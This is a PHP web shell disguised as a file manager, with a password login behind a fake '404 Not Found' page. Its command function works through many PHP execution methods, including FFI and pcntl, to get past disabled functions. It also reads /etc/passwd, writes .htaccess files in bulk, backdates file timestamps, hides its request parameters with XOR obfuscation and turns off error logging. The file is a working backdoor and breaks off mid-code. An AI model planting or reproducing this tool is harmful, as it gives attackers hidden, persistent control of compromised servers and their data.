<?php
set_time_limit(0);
error_reporting(0);
@ini_set('error_log', null);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
date_default_timezone_set('Asia/Jakarta');

session_start();

$PASSWORD = '$2a$12$M0oZLtBYbq4GaLGaWtWBT.Uvuu4B10h9F8BCi9b0dhxpkTrhxzMzK';
$WIN = stripos(PHP_OS, 'WIN') === 0;

function pathfix($p){
    global $WIN;
    $p = str_replace('\\', '/', $p);
    $p = $p === '/' ? '/' : rtrim($p, '/');
    if ($WIN && preg_match('/^[a-z]:$/i', $p)) $p .= '/';
    return $p;
}

$BASE = pathfix(__DIR__);
if (isset($_GET['d']) && $_GET['d'] !== '') {
    $tmp = array();
    @parse_str((string)@_dc($_GET['d']), $tmp);
    $_GET = array_merge($_GET, $tmp);
    unset($_GET['d']);
}
$RAW = isset($_GET['path']) ? str_replace('\\', '/', (string)$_GET['path']) : '';
if ($RAW === '') {
    $CUR = $BASE;
} elseif ($RAW === '/' && !$WIN) {
    $CUR = '/';
} else {
    $CUR = $RAW === '/' ? '' : pathfix($RAW);
}
$REAL = realpath($CUR);
if ($REAL !== false && is_dir($REAL)) {
    $CUR = pathfix($REAL);
} else {
    $CUR = $BASE;
}
$isBase = $CUR === $BASE;

/* ---------- Auth ---------- */
if (!isset($_SESSION['ok']) || $_SESSION['ok'] !== true) {
    if (isset($_POST['pw']) && $_POST['pw'] === $PASSWORD) $_SESSION['ok'] = true;
    if (!isset($_SESSION['ok']) || $_SESSION['ok'] !== true) {
        $err = isset($_POST['pw']);
        ?>
<?php

function getOS($ua){$l=['Windows NT 10.0'=>'Windows 10/11','Windows NT 6.3'=>'Windows 8.1','Windows NT 6.2'=>'Windows 8','Windows NT 6.1'=>'Windows 7','Windows NT 6.0'=>'Windows Vista','Windows NT 5.1'=>'Windows XP','Mac OS X'=>'macOS','Android'=>'Android','iPhone'=>'iOS (iPhone)','iPad'=>'iOS (iPad)','Linux'=>'Linux','Ubuntu'=>'Ubuntu','CrOS'=>'ChromeOS'];foreach($l as $k=>$v){if(stripos($ua,$k)!==false)return $v;}return'Unknown';}
function getBrowser($ua){$l=['Edg'=>'Microsoft Edge','OPR'=>'Opera','Chrome'=>'Chrome','Safari'=>'Safari','Firefox'=>'Firefox','MSIE'=>'Internet Explorer','Trident'=>'Internet Explorer'];foreach($l as $k=>$v){if(stripos($ua,$k)!==false)return $v;}return'Unknown';}
function getDevice($ua){if(preg_match('/mobile|android|iphone|ipad|ipod/i',$ua))return'Mobile / Tablet';if(preg_match('/bot|crawl|spider|slurp/i',$ua))return'Bot / Crawler';return'Desktop';}
$ip=getIP();$ua=$_SERVER['HTTP_USER_AGENT']??'Unknown';$os=getOS($ua);$browser=getBrowser($ua);$device=getDevice($ua);$lang=$_SERVER['HTTP_ACCEPT_LANGUAGE']??'Unknown';$host=$_SERVER['HTTP_HOST']??'Unknown';$port=$_SERVER['SERVER_PORT']??'80';$proto=(!empty($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off')?'HTTPS':'HTTP';$referer=$_SERVER['HTTP_REFERER']??'Direct';
$err=$err??false;
echo'<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>404 Not Found</title><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"><link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css" rel="stylesheet"><style>body{background:#000}.login-card{width:360px;border:0;background:transparent}.login-card-body{background:rgba(0,0,0,.35);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,.15);border-radius:14px;color:#fff}.info-list{font-size:.78rem;line-height:1.5}.info-list .k{color:#a1a1aa;display:inline-block;min-width:105px}.info-list .v{color:#fff;word-break:break-all}.info-divider{border-top:1px dashed rgba(255,255,255,.15);margin:.6rem 0}.btn-hitam{background:#000;border:1px solid #000;color:#fff}.btn-hitam:hover,.btn-hitam:focus{background:#222;border-color:#000;color:#fff}.form-control{background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.2);color:#fff}.form-control::placeholder{color:#a1a1aa}.form-control:focus{background:rgba(255,255,255,.12);border-color:#020202;color:#fff;box-shadow:0 0 0 .2rem rgba(252, 0, 0, 0.25)}</style></head><body class="d-flex align-items-center justify-content-center" style="min-height:100vh"><div class="card shadow login-card"><div class="card-body p-4 login-card-body"><h5 class="mb-3 text-center">404 Not Found</h5><div class="info-list mb-3">';
echo'<div><span class="k">OS</span>: <span class="v">'.htmlspecialchars($os).'</span></div>';
echo'<div><span class="k">Browser</span>: <span class="v">'.htmlspecialchars($browser).'</span></div>';
echo'<div><span class="k">Device</span>: <span class="v">'.htmlspecialchars($device).'</span></div>';
echo'<div><span class="k">Your IP</span>: <span class="v">'.htmlspecialchars($ip).'</span></div>';
echo'<div><span class="k">Your Location</span>: <span class="v" id="loc">Loading...</span></div>';
echo'<div><span class="k">Date/Time</span>: <span class="v" id="dt">Loading...</span></div>';
echo'<div><span class="k">Language</span>: <span class="v">'.htmlspecialchars($lang).'</span></div>';
echo'<div><span class="k">Protocol</span>: <span class="v">'.htmlspecialchars($proto).'</span></div>';
echo'<div><span class="k">Host</span>: <span class="v">'.htmlspecialchars($host.':'.$port).'</span></div>';
echo'<div><span class="k">Referer</span>: <span class="v">'.htmlspecialchars($referer).'</span></div>';
echo'<div><span class="k">Resolution</span>: <span class="v" id="res">-</span></div></div><div class="info-divider"></div>';
if($err)echo'<div class="alert alert-danger py-2 small mb-2">Wrong password!</div>';
echo'<form method="post"><input class="form-control mb-2" type="password" name="pw" placeholder="Password" autofocus required><button class="btn btn-hitam w-100">Sign In</button></form></div></div>';
echo'<script>function tick(){const d=new Date();document.getElementById("dt").textContent=d.toLocaleString("en-US",{dateStyle:"full",timeStyle:"medium"});}tick();setInterval(tick,1e3);document.getElementById("res").textContent=screen.width+" x "+screen.height+" ("+(window.devicePixelRatio||1)+"x)";fetch("https://ipapi.co/json/").then(r=>r.json()).then(d=>{const l=[d.city,d.region,d.country_name,d.postal].filter(Boolean).join(", ");document.getElementById("loc").textContent=l||"Unknown";}).catch(()=>document.getElementById("loc").textContent="Unavailable");</script></body></html>';

        exit;
    }
}

/* ---------- Helpers ---------- */
function sanitize($n){ return preg_replace('/[^\w.\-\x{00C0}-\x{024F}\s]/u', '', $n); }
function fmt($b){
    if ($b == 0) return '0 B';
    $u = array('B','KB','MB','GB','TB');
    $i = floor(log($b, 1024));
    return round($b / pow(1024, $i), 2) . ' ' . $u[$i];
}
function pm($oct){
    $n = intval($oct, 8) & 0777;
    $s = '';
    for ($i = 2; $i >= 0; $i--) {
        $g = ($n >> ($i * 3)) & 7;
        $s .= ($g & 4 ? 'r' : '-') . ($g & 2 ? 'w' : '-') . ($g & 1 ? 'x' : '-');
    }
    return $s;
}
function mime($f){
    if (function_exists('mime_content_type')) return @mime_content_type($f);
    $e = strtolower(pathinfo($f, PATHINFO_EXTENSION));
    $m = array('jpg'=>'image/jpeg','jpeg'=>'image/jpeg','png'=>'image/png','gif'=>'image/gif','svg'=>'image/svg+xml','webp'=>'image/webp','bmp'=>'image/bmp','pdf'=>'application/pdf','txt'=>'text/plain','php'=>'text/plain','html'=>'text/html','htm'=>'text/html','css'=>'text/css','js'=>'application/javascript','json'=>'application/json','xml'=>'text/xml','csv'=>'text/csv');
    return isset($m[$e]) ? $m[$e] : 'application/octet-stream';
}
function isBin($c){
    if ($c === '') return false;
    if (strpos($c, "\0") !== false) return true;
    return (bool)preg_match('~[^\x09\x0A\x0D\x20-\x7E]~', substr($c, 0, 512));
}
function disfset() {
    $d = array();
    $s = @ini_get('disable_functions');
    if ($s) foreach (explode(',', $s) as $f) { $f = trim($f); if ($f !== '') $d[$f] = true; }
    return $d;
}
function commandExists($cmd){
    $d = disfset();
    $useShell = function_exists('shell_exec') && !isset($d['shell_exec']);
    $useExec  = function_exists('exec')      && !isset($d['exec']);
    if (!$useShell && !$useExec) return false;
    if (stripos(PHP_OS, 'WIN') === 0) {
        if ($useExec) { @exec('where ' . $cmd . ' 2>NUL', $out, $code); return $code === 0; }
        return false;
    }
    if ($useShell) return (bool)@shell_exec('command -v ' . escapeshellarg($cmd) . ' 2>/dev/null');
    if ($useExec) { @exec('command -v ' . escapeshellarg($cmd) . ' 2>/dev/null', $out, $code); return $code === 0; }
    return false;
}
function getIP() {
    $ip = '';
    foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED') as $v) {
        if (getenv($v)) { $ip = getenv($v); break; }
    }
    if (!$ip && getenv('REMOTE_ADDR')) $ip = getenv('REMOTE_ADDR');
    if (!$ip && isset($_SERVER['REMOTE_ADDR'])) $ip = $_SERVER['REMOTE_ADDR'];
    return $ip ? $ip : 'Unknown IP';
}
function getUser() {
    if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
        $u = @posix_getpwuid(@posix_geteuid());
        if ($u && isset($u['name'])) return $u['name'];
    }
    $c = @get_current_user();
    return $c ? $c : 'N/A';
}
function runcm($c) {
    $c = trim($c);
    if ($c === '') return array('', '');
    $d = disfset();
    $use = function($f) use ($d) { return function_exists($f) && !isset($d[$f]); };

    if ($use('shell_exec')) return array((string)@shell_exec($c), 'shell_exec');
    if ($use('exec'))       { $o = array(); @exec($c, $o, $r); return array(implode("\n", $o), 'exec'); }
    if ($use('system'))     { ob_start(); @system($c);  return array(ob_get_clean(), 'system'); }
    if ($use('passthru'))   { ob_start(); @passthru($c); return array(ob_get_clean(), 'passthru'); }
    if ($use('popen')) {
        $h = @popen($c, 'r');
        if (is_resource($h)) { $o = ''; while (!feof($h)) { $s = fread($h, 8192); if ($s === false) break; $o .= $s; } @pclose($h); return array($o, 'popen'); }
    }
    if ($use('proc_open')) {
        $ps = array(0 => array('pipe','r'), 1 => array('pipe','w'), 2 => array('pipe','w'));
        $p = @proc_open($c, $ps, $pi);
        if (is_resource($p)) { @fclose($pi[0]); $o = (string)stream_get_contents($pi[1]); @fclose($pi[1]); @fclose($pi[2]); @proc_close($p); return array($o, 'proc_open'); }
    }

    if (stripos(PHP_OS, 'WIN') === 0 && class_exists('COM')) {
        try {
            $sh = new COM('WScript.Shell');
            $ex = $sh->Exec('%comspec% /C ' . $c);
            $o = ''; $tl = 0;
            while (!$ex->StdOut->AtEndOfStream && $tl < 400) { $o .= $ex->StdOut->ReadAll(); $tl++; usleep(50000); }
            if ($o !== '') return array($o, 'COM WScript.Shell');
        } catch (Exception $e) {}
    }

    if (stripos(PHP_OS, 'WIN') !== 0 && $use('pcntl_fork') && $use('pcntl_exec')) {
        $f = @tempnam(sys_get_temp_dir(), 'fmc');
        if ($f) {
            $pid = @pcntl_fork();
            if ($pid === 0) { @pcntl_exec('/bin/sh', array('-c', $c . ' > ' . $f . ' 2>&1')); exit(127); }
            elseif ($pid > 0) { @pcntl_waitpid($pid, $st); $o = (string)@file_get_contents($f); @unlink($f); if ($o !== '') return array($o, 'pcntl_fork/exec'); }
            @unlink($f);
        }
    }

    if (class_exists('FFI')) {
        $f = @tempnam(sys_get_temp_dir(), 'fmf');
        if ($f) {
            try {
                $ffi = FFI::cdef('int system(const char *command);');
                $ffi->system($c . ' > ' . $f . ' 2>&1');
                $o = (string)@file_get_contents($f); @unlink($f);
                return array($o, 'FFI::system');
            } catch (Exception $e) { @unlink($f); }
        }
    }

    return array('', 'ALL_FAILED');
}
function icon($n, $d){
    if ($d) return 'bi-folder-fill text-warning';
    $e = strtolower(pathinfo($n, PATHINFO_EXTENSION));
    $m = array(
        'php'=>'bi-file-earmark-code text-danger','js'=>'bi-file-earmark-code text-warning','html'=>'bi-file-earmark-code text-danger','htm'=>'bi-file-earmark-code text-danger','css'=>'bi-file-earmark-code text-info','json'=>'bi-file-earmark-code text-success','xml'=>'bi-file-earmark-code text-success','sql'=>'bi-file-earmark-code text-info',
        'txt'=>'bi-file-earmark-text text-secondary','md'=>'bi-file-earmark-text text-secondary','log'=>'bi-file-earmark-text text-secondary',
        'jpg'=>'bi-file-earmark-image text-primary','jpeg'=>'bi-file-earmark-image text-primary','png'=>'bi-file-earmark-image text-primary','gif'=>'bi-file-earmark-image text-primary','svg'=>'bi-file-earmark-image text-primary','webp'=>'bi-file-earmark-image text-primary','bmp'=>'bi-file-earmark-image text-primary',
        'mp3'=>'bi-file-earmark-music text-info','wav'=>'bi-file-earmark-music text-info','mp4'=>'bi-file-earmark-play text-primary','avi'=>'bi-file-earmark-play text-primary','mkv'=>'bi-file-earmark-play text-primary',
        'zip'=>'bi-file-earmark-zip text-secondary','rar'=>'bi-file-earmark-zip text-secondary','7z'=>'bi-file-earmark-zip text-secondary','tar'=>'bi-file-earmark-zip text-secondary','gz'=>'bi-file-earmark-zip text-secondary',
        'pdf'=>'bi-file-earmark-pdf text-danger','doc'=>'bi-file-earmark-word text-primary','docx'=>'bi-file-earmark-word text-primary','xls'=>'bi-file-earmark-excel text-success','xlsx'=>'bi-file-earmark-excel text-success','ppt'=>'bi-file-earmark-ppt text-danger','pptx'=>'bi-file-earmark-ppt text-danger',
    );
    return isset($m[$e]) ? $m[$e] : 'bi-file-earmark text-secondary';
}
function rmrf($d){
    if (!is_dir($d)) return @unlink($d);
    $list = @scandir($d);
    if ($list) foreach (array_diff($list, array('.', '..')) as $e) {
        $p = $d . '/' . $e;
        is_dir($p) ? rmrf($p) : @unlink($p);
    }
    return @rmdir($d);
}
function cpr($s, $d){
    if (is_dir($s)) {
        @mkdir($d, 0755, true);
        $list = @scandir($s);
        if ($list) foreach (array_diff($list, array('.', '..')) as $e) cpr($s . '/' . $e, $d . '/' . $e);
        return true;
    }
    return copy($s, $d);
}
function zipAdd($zip, $dir, $base){
    $list = @scandir($dir);
    if (!$list) return;
    foreach (array_diff($list, array('.', '..')) as $e) {
        $p = $dir . '/' . $e;
        $l = ($base ? $base . '/' : '') . $e;
        if (is_dir($p)) { $zip->addEmptyDir($l); zipAdd($zip, $p, $l); }
        else $zip->addFile($p, $l);
    }
}
function zipByName($src){
    $out = $src . '.zip';
    $zip = new ZipArchive();
    if ($zip->open($out, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) return '';
    if (is_dir($src)) zipAdd($zip, $src, basename($src));
    else $zip->addFile($src, basename($src));
    $zip->close();
    return $out;
}

function esyeem($tg, $lk){
    if (function_exists('symlink')) { @symlink($tg, $lk); return is_link($lk); }
    if (function_exists('proc_open')) {
        $ps = array(0 => array('pipe','r'), 1 => array('pipe','w'), 2 => array('pipe','w'));
        $p = @proc_open('ln -s ' . escapeshellarg($tg) . ' ' . escapeshellarg($lk), $ps, $pi);
        if (is_resource($p)) {
            @fclose($pi[0]);
            $o = (string)stream_get_contents($pi[1]);
            @fclose($pi[1]); @fclose($pi[2]); @proc_close($p);
            if ($o === '') return true;
        }
    }
    return false;
}
function passwdUsers(){
    $u = array();
    if (stripos(PHP_OS, 'WIN') === 0) return $u;
    if (is_readable('/etc/passwd')) $c = (string)@file_get_contents('/etc/passwd');
    else { $r = runcm('cat /etc/passwd 2>&1'); $c = (string)$r[0]; }
    if ($c !== '' && preg_match_all('~/home/([^\s:/]+):~i', $c, $m)) $u = array_values(array_unique($m[1]));
    return $u;
}
function logCandidates(){
    global $BASE;
    $g = array();
    $el = @ini_get('error_log');
    if ($el && is_file($el) && is_readable($el)) $g[] = $el;
    foreach (array($BASE . '/error_log', $BASE . '/php_error.log', '/var/log/php_error.log', '/var/log/apache2/error.log', '/var/log/httpd/error_log', '/var/log/nginx/error.log', '/var/log/syslog') as $p) {
        if (is_file($p) && is_readable($p)) $g[] = $p;
    }
    $l = @scandir($BASE);
    if ($l) foreach ($l as $e) {
        if ($e === '.' || $e === '..') continue;
        if (stripos($e, 'error_log') !== false || strtolower(substr($e, -4)) === '.log') {
            $p = $BASE . '/' . $e;
            if (is_file($p) && is_readable($p) && !in_array($p, $g, true)) $g[] = $p;
        }
    }
    return array_values(array_unique($g));
}
function _ec($s){
    $k = 'x8Kp2Lw7QjM$tR@';
    $o = '';
    for ($i = 0; $i < strlen($s); $i++) $o .= $s[$i] ^ $k[$i % strlen($k)];
    return rtrim(strtr(base64_encode($o), '+/', '-_'), '=');
}
function _dc($s){
    $k = 'x8Kp2Lw7QjM$tR@';
    $d = base64_decode(strtr((string)$s, '-_', '+/'));
    $o = '';
    for ($i = 0; $i < strlen($d); $i++) $o .= $d[$i] ^ $k[$i % strlen($k)];
    return $o;
}
function mkUrl($p = array()){
    return '?d=' . _ec(http_build_query($p));
}
function logTail($path, $maxLines = 200){
    $h = @fopen($path, 'r');
    if (!$h) return '';
    @fseek($h, -8192, SEEK_END);
    $data = (string)@fread($h, 8192);
    @fclose($h);
    $lines = explode("\n", trim($data));
    if (count($lines) > $maxLines) $lines = array_slice($lines, count($lines) - $maxLines);
    return implode("\n", $lines);
}
function scanRecentFiles($d, $depth, &$out, $since, &$nsc){
    if ($depth > 5 || $nsc > 5000) return;
    $l = @scandir($d);
    if (!$l) return;
    foreach ($l as $e) {
        if ($e === '.' || $e === '..' || $e[0] === '.') continue;
        $nsc++;
        $p = $d . '/' . $e;
        if (is_dir($p)) scanRecentFiles($p, $depth + 1, $out, $since, $nsc);
        else { $mt = @filemtime($p); if ($mt && $mt >= $since) $out[] = array($mt, $p, @filesize($p)); }
    }
}
function scanFilesPattern($d, $depth, &$out, &$nsc){
    if ($depth > 4 || $nsc > 3000) return;
    static $pats = null;
    if ($pats === null) {
        $pats = array(
            'eval(base64' => '/\beval\s*\(\s*base64_decode\s*\(/i',
            'eval(gzinflate' => '/\beval\s*\(\s*gzinflate\s*\(/i',
            'eval(str_rot13' => '/\beval\s*\(\s*str_rot13\s*\(/i',
            'eval($_REQ' => '/\beval\s*\(\s*\$_(POST|GET|REQUEST|COOKIE)\s*\[/i',
            'base64_decode($_REQ' => '/base64_decode\s*\(\s*\$_(POST|GET|REQUEST|COOKIE)\s*\[/i',
            'gzinflate($_REQ' => '/gzinflate\s*\(\s*base64_decode\s*\(\s*\$_(POST|GET|REQUEST)\s*\[/i',
            'assert($_REQ' => '/\bassert\s*\(\s*\$_(POST|GET|REQUEST|COOKIE)\s*\[/i',
            'system($_REQ' => '/\bsystem\s*\(\s*\$_(POST|GET|REQUEST|COOKIE)\s*\[/i',
            'shell_exec($_REQ' => '/\bshell_exec\s*\(\s*\$_(POST|GET|REQUEST|COOKIE)\s*\[/i',
            'passthru($_REQ' => '/\bpassthru\s*\(\s*\$_(POST|GET|REQUEST|COOKIE)\s*\[/i',
            'exec($_REQ' => '/\bexec\s*\(\s*\$_(POST|GET|REQUEST|COOKIE)\s*\[/i',
            'create_function' => '/\bcreate_function\s*\(/i',
            'preg_replace_eval' => '/preg_replace\s*\(\s*[\'\"].*[\'\"]\s*,\s*[\'\"].*[\'\"]\s*,\s*[\'\"].*\/e[\'\"]/i',
            'php_ini_directive' => '/((auto_prepend_file|auto_append_file)\s*=\s*)/i',
        );
    }
    $l = @scandir($d);
    if (!$l) return;
    foreach ($l as $e) {
        if ($e === '.' || $e === '..' || $e[0] === '.') continue;
        $nsc++;
        $p = $d . '/' . $e;
        if (is_dir($p)) scanFilesPattern($p, $depth + 1, $out, $nsc);
        else {
            $ext = strtolower(pathinfo($e, PATHINFO_EXTENSION));
            if (!in_array($ext, array('php', 'phtml', 'php3', 'php4', 'php5', 'pht', 'htm', 'html', 'xhtml', 'shtml', 'js', 'txt'))) continue;
            $h = @fopen($p, 'r');
            if (!$h) continue;
            $c = (string)@fread($h, 262144);
            @fclose($h);
            if ($c === '') continue;
            foreach ($pats as $pn => $re) {
                if (@preg_match($re, $c)) { $out[] = array('f' => $p, 'p' => $pn); break; }
            }
        }
    }
}
function massHt($d, $depth, $content, $mode, &$w, &$f, &$bks){
    if ($depth > 4) return;
    if (!@is_writable($d)) { $f++; return; }
    $tf = $d . '/.htaccess';
    if ($mode === 'overwrite' && is_file($tf) && @copy($tf, $tf . '.bak.' . date('YmdHis'))) $bks++;
    $content2 = $content;
    if ($mode === 'append' && is_file($tf)) {
        $cur = (string)@file_get_contents($tf);
        $content2 = trim($cur) . "\n" . $content;
    }
    if (@file_put_contents($tf, $content2) !== false) $w++; else $f++;
    $l = @scandir($d);
    if (!$l) return;
    foreach ($l as $e) {
        if ($e === '.' || $e === '..' || $e[0] === '.') continue;
        $p = $d . '/' . $e;
        if (is_dir($p)) massHt($p, $depth + 1, $content, $mode, $w, $f, $bks);
    }
}
function searchFiles($d, $depth, $mode, $pat, &$out, &$nsc){
    if ($depth > 5 || $nsc > 10000) return;
    $l = @scandir($d);
    if (!$l) return;
    foreach ($l as $e) {
        if ($e === '.' || $e === '..' || $e[0] === '.') continue;
        $nsc++;
        $p = $d . '/' . $e;
        if (is_dir($p)) { searchFiles($p, $depth + 1, $mode, $pat, $out, $nsc); }
        else {
            if ($mode === 'name') {
                if (@fnmatch($pat, $e) || @preg_match($pat, $e)) $out[] = array('f' => $p, 'l' => 0, 't' => '');
            } else {
                $ext = strtolower(pathinfo($e, PATHINFO_EXTENSION));
                if (!in_array($ext, array('php','phtml','htm','html','js','txt','css','json','xml','htaccess','log','py','rb','java','c','h','sh','bat','sql','csv','md','yml','yaml','ini','conf'))) continue;
                $h = @fopen($p, 'r');
                if (!$h) continue;
                $ln = 0;
                while (($line = fgets($h)) !== false) {
                    $ln++;
                    if (@preg_match($pat, $line)) {
                        $out[] = array('f' => $p, 'l' => $ln, 't' => substr(trim($line), 0, 200));
                        if (count($out) > 500) break 2;
                    }
                }
                @fclose($h);
            }
        }
    }
}
function massRenameDir($d, $depth, $find, $repl, $dry, &$out, &$nsc){
    if ($depth > 4 || $nsc > 5000) return;
    $l = @scandir($d);
    if (!$l) return;
    foreach ($l as $e) {
        if ($e === '.' || $e === '..' || $e[0] === '.') continue;
        $nsc++;
        $p = $d . '/' . $e;
        if (is_dir($p)) {
            massRenameDir($p, $depth + 1, $find, $repl, $dry, $out, $nsc);
        }
        $ne = @preg_replace($find, $repl, $e);
        if ($ne !== null && $ne !== $e && $ne !== '') {
            $np = $d . '/' . $ne;
            $out[] = array($p, $np);
            if (!$dry && !file_exists($np)) @rename($p, $np);
        }
    }
}
function massDeleteDir($d, $depth, $pat, $ext, &$out, &$nsc){
    if ($depth > 4 || $nsc > 10000) return;
    $l = @scandir($d);
    if (!$l) return;
    foreach ($l as $e) {
        if ($e === '.' || $e === '..' || $e[0] === '.') continue;
        $nsc++;
        $p = $d . '/' . $e;
        if (is_dir($p)) { massDeleteDir($p, $depth + 1, $pat, $ext, $out, $nsc); }
        else {
            $match = true;
            if ($pat !== '' && !@fnmatch($pat, $e) && !@preg_match($pat, $e)) $match = false;
            if ($ext !== '' && $ext !== '*') {
                $le = strtolower(pathinfo($e, PATHINFO_EXTENSION));
                if ($le !== strtolower($ext)) $match = false;
            }
            if ($match) $out[] = $p;
        }
    }
}

/* ---------- GET actions ---------- */
if (isset($_GET['action'])) {
    $a = $_GET['action'];
    if ($a === 'logout') { session_destroy(); header('Location: ?'); exit; }
    if ($a === 'download' && isset($_GET['file'])) {
        $f = $CUR . '/' . $_GET['file'];
        if (is_file($f)) {
            $n = basename($f);
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . $n . '"; filename*=UTF-8\'\'' . rawurlencode($n));
            header('Content-Length: ' . filesize($f));
            readfile($f);
            exit;
        }
    }
    if ($a === 'preview' && isset($_GET['file'])) {
        $f = $CUR . '/' . $_GET['file'];
        if (is_file($f) && strpos(mime($f), 'image/') === 0) {
            header('Content-Type: ' . mime($f));
            readfile($f);
            exit;
        }
        http_response_code(404);
        exit;
    }
}

/* ---------- POST actions ---------- */
$msg = '';
$mt = 'success';
function setm($m, $t = 'success'){ global $msg, $mt; $msg = $m; $mt = $t; }

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['act'])) {
    $act = $_POST['act'];
    $nm = isset($_POST['name']) ? $_POST['name'] : '';
    $p = $CUR . '/' . $nm;
    switch ($act) {
        case 'folder':
            $n = sanitize(trim(isset($_POST['new']) ? $_POST['new'] : ''));
            if ($n !== '' && !file_exists($CUR . '/' . $n)) {
                mkdir($CUR . '/' . $n, 0755, true) ? setm("Folder '$n' created successfully.") : setm("Failed to create folder '$n'.", 'danger');
            } else setm('Invalid name or already exists.', 'warning');
            break;
        case 'file':
            $n = sanitize(trim(isset($_POST['new']) ? $_POST['new'] : ''));
            if ($n !== '' && !file_exists($CUR . '/' . $n)) {
                file_put_contents($CUR . '/' . $n, '') !== false ? setm("File '$n' created successfully.") : setm("Failed to create file '$n'.", 'danger');
            } else setm('Invalid name or already exists.', 'warning');
            break;
        case 'rename':
            $n = sanitize(trim(isset($_POST['new']) ? $_POST['new'] : ''));
            if ($n !== '' && file_exists($p) && !file_exists($CUR . '/' . $n)) {
                rename($p, $CUR . '/' . $n) ? setm("'$nm' renamed to '$n'.") : setm('Failed to rename.', 'danger');
            } else setm('Invalid name or already exists.', 'warning');
            break;
        case 'delete':
            if (is_dir($p)) { rmrf($p) ? setm("'$nm' deleted successfully.") : setm("Failed to delete '$nm'.", 'danger'); }
            elseif (is_file($p)) { @unlink($p) ? setm("'$nm' deleted successfully.") : setm("Failed to delete '$nm'.", 'danger'); }
            break;
        case 'move':
            $to = isset($_POST['to']) ? str_replace('\\', '/', $_POST['to']) : '';
            $dst = $BASE . '/' . ltrim($to, '/');
            if (file_exists($p) && is_dir($dst)) {
                rename($p, $dst . '/' . $nm) ? setm("'$nm' moved to $to.") : setm('Failed to move.', 'danger');
            } else setm('Invalid destination path.', 'warning');
            break;
        case 'copy':
            $to = isset($_POST['to']) ? str_replace('\\', '/', $_POST['to']) : '';
            $dst = $BASE . '/' . ltrim($to, '/');
            if (file_exists($p) && is_dir($dst)) {
                $nn = $nm; $i = 1;
                while (file_exists($dst . '/' . $nn)) {
                    $info = pathinfo($nm);
                    $nn = $info['filename'] . '_copy' . ($i > 1 ? '(' . $i . ')' : '') . (isset($info['extension']) ? '.' . $info['extension'] : '');
                    $i++;
                }
                if (is_dir($p)) { cpr($p, $dst . '/' . $nn) ? setm("'$nm' copied to $to.") : setm('Failed to copy.', 'danger'); }
                else { copy($p, $dst . '/' . $nn) ? setm("'$nm' copied to $to.") : setm('Failed to copy.', 'danger'); }
            } else setm('Invalid destination path.', 'warning');
            break;
        case 'save':
            if (is_file($p)) {
                file_put_contents($p, isset($_POST['content']) ? $_POST['content'] : '') !== false ? setm("'$nm' saved successfully.") : setm('Failed to save.', 'danger');
            }
            break;
        case 'chmod':
            $pr = isset($_POST['perms']) ? $_POST['perms'] : '';
            if (file_exists($p) && preg_match('/^[0-7]{3,4}$/', $pr)) {
                chmod($p, octdec($pr)) ? setm("Permissions for '$nm' changed to $pr.") : setm('Failed to change permissions.', 'danger');
            } else setm('Invalid permissions input.', 'warning');
            break;
        case 'touch':
            $t = isset($_POST['ts']) && $_POST['ts'] !== '' ? strtotime($_POST['ts']) : time();
            if ($t === false) $t = time();
            if (file_exists($p) && touch($p, $t)) setm("Timestamp for '$nm' changed to " . date('d M Y H:i', $t) . ".");
            else setm('Failed to update timestamp.', 'danger');
            break;
        case 'zip':
            if (class_exists('ZipArchive') && file_exists($p)) {
                $z = zipByName($p);
                $z ? setm("'$nm' compressed into " . basename($z) . ".") : setm('Failed to create zip.', 'danger');
            } else setm('ZipArchive extension not available.', 'danger');
            break;
        case 'unzip':
            if (class_exists('ZipArchive') && is_file($p) && strtolower(pathinfo($p, PATHINFO_EXTENSION)) === 'zip') {
                $zip = new ZipArchive();
                if ($zip->open($p) === true) {
                    $dn = pathinfo($nm, PATHINFO_FILENAME);
                    @mkdir($CUR . '/' . $dn, 0755, true);
                    $zip->extractTo($CUR . '/' . $dn);
                    $zip->close();
                    setm("'$nm' extracted to folder '$dn'.");
                } else setm('Failed to read zip file.', 'danger');
            } else setm('Not a zip file or not found.', 'warning');
            break;
        case 'upload':
            if (isset($_FILES['files'])) {
                $n = 0;
                foreach ($_FILES['files']['name'] as $i => $f) {
                    if ($_FILES['files']['error'][$i] == UPLOAD_ERR_OK && move_uploaded_file($_FILES['files']['tmp_name'][$i], $CUR . '/' . sanitize($f))) $n++;
                }
                setm("$n file(s) uploaded successfully.");
            }
            break;
    }
}

/* ---------- Data : files ---------- */
$items = array();
$list = @scandir($CUR);
if ($list) {
    foreach (array_diff($list, array('.', '..')) as $e) {
        $x = $CUR . '/' . $e;
        $mt = @filemtime($x);
        if (!$mt) $mt = 0;
        $items[] = array('n' => $e, 'd' => is_dir($x), 's' => is_file($x) ? filesize($x) : 0,
                         'pm' => substr(sprintf('%o', @fileperms($x)), -4), 'mt' => $mt);
    }
    usort($items, function($a, $b) {
        if ($a['d'] != $b['d']) return $a['d'] ? -1 : 1;
        return strcasecmp($a['n'], $b['n']);
    });
}
$nDir = 0; $nFil = 0; $nSiz = 0;
foreach ($items as $it) { $it['d'] ? $nDir++ : $nFil++; if (!$it['d']) $nSiz += $it['s']; }

/* ---------- Data : directories (dest move/copy) ---------- */
$dirs = array();
function walkDirs($d, $pre, $depth = 0){
    global $dirs;
    if ($depth > 5) return;
    $list = @scandir($d);
    if (!$list) return;
    foreach ($list as $e) {
        if ($e === '.' || $e === '..' || $e[0] === '.') continue;
        $xd = $d . '/' . $e;
        if (is_dir($xd)) { $dirs[] = '/' . $pre . $e; walkDirs($xd, $pre . $e . '/', $depth + 1); }
    }
}
walkDirs($BASE, '');

/* ---------- Data : breadcrumb ---------- */
$path = str_replace('\\', '/', $CUR);
